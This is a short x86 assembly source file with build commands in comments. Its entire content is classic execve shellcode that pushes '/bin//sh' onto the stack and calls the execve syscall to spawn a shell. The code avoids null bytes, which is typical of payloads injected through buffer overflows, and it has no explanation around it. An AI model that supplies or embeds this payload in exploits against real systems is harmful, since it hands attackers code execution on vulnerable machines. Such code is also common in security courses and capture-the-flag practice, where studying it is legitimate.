;nasm -f elf retsh.asm
;ld -m elf_i386 -o retsh retsh.o
section .text
global _start
_start:
xor eax, eax
push eax
push 0x68732f2f ;//sh
push 0x6e69622f ;/bin
mov ebx, esp
push eax
push ebx
mov ecx, esp
xor edx, edx
mov al, 0xb
int 0x80